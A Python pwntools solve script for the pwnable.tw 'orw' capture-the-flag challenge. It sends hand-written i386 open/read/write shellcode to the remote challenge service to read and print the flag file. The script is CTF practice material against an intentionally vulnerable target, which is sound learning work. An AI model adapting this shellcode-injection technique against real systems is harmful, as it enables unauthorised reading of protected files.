#!/usr/bin/env python
from pwn import *


#p=process(argv=['./orw'])
p=remote('chall.pwnable.tw',10001)
context.log_level="debug"
context.arch='i386'
#gdb.attach(p,'b *0x0804858A\n')



p.recvuntil('Give my your shellcode:')


shellcode_addr=0x0804A060
fpath_addr=0x0804A0B0
ljust_len=fpath_addr-shellcode_addr

fpath='/home/orw/flag\x00'
#fpath='./flag\x00'

shellcode='mov eax,5;mov ebx,0x0804A0B0;xor ecx,ecx;mov edx,0644;int 0x80;'  # open
shellcode+='mov ebx,eax;mov ecx,0x0804A0B0;mov edx,40;int 0x80;'             
shellcode+='mov eax,4;mov ebx,1;mov ecx,0x0804A0B0;mov edx,40;int 0x80;'        # write

shellcode=(asm(shellcode)).ljust(ljust_len,'\x90')+fpath


p.send(shellcode)





p.interactive()
